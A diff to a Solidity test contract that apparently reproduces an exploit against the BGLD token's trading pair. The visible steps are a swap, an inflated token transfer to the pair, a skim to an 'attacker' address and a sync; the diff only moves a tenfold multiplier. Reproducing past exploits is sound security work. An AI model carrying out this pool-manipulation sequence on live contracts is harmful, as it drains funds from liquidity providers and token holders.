@@ -162,7 +162,7 @@ contract BGLDTest is Test, BlockLoader {
     }
 
     function burn_pair_bgld(uint256 amount) internal {
-        bgld.transfer(address(pair), amount);
+        bgld.transfer(address(pair), amount * 10);
         pair.skim(attacker);
     }
 
@@ -180,7 +180,7 @@ contract BGLDTest is Test, BlockLoader {
         printBalance("After step0 ");
         swap_pair_wbnb_bgld(wbnb.balanceOf(attacker));
         printBalance("After step1 ");
-        burn_pair_bgld(bgld.balanceOf(address(pair)) * 10);
+        burn_pair_bgld(bgld.balanceOf(address(pair)));
         printBalance("After step2 ");
         sync_pair();
         printBalance("After step3 ");
